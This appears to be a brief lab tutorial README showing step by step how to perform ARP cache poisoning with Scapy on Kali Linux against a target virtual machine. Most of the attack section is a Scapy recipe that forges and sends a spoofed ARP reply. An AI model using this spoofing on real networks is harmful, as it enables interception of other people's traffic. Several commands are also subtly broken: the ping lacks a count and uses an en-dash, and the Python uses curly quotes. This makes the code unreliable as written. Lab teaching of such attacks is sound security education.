# arp-poision
Implementation using Scapy on Kali Linux

ARP spoofing can be implemented using Scapy on Kali Linux. Follow these steps to perform the same −
Step 1: Address of attacker machine

In this step, we will find the IP address of the attacker machine by running the command ifconfig on the command prompt of Kali Linux.
Step 2: Address of target machine

In this step, we will find the IP address of the target machine by running the command ifconfig on the command prompt of Kali Linux, which we need to open on another virtual machine.
Step 3: Ping the target machine

In this step, we need to ping the target machine from the attacker machine with the help of following command −

Ping –c 192.168.43.85(say IP address of target machine)

Step 4: ARP cache on target machine

We already know that two machines use ARP packets to exchange MAC addresses hence after step 3, we can run the following command on the target machine to see the ARP cache −

arp -n

Step 5: Creation of ARP packet using Scapy

We can create ARP packets with the help of Scapy as follows −

scapy
arp_packt = ARP()
arp_packt.display()

Step 6: Sending of malicious ARP packet using Scapy

We can send malicious ARP packets with the help of Scapy as follows −

arp_packt.pdst = “192.168.43.85”(say IP address of target machine)
arp_packt.hwsrc = “11:11:11:11:11:11”
arp_packt.psrc = ”1.1.1.1”
arp_packt.hwdst = “ff:ff:ff:ff:ff:ff”
send(arp_packt)

Step 7: Again check ARP cache on target machine

Now if we will again check ARP cache on target machine then we will see the fake address ‘1.1.1.1’.
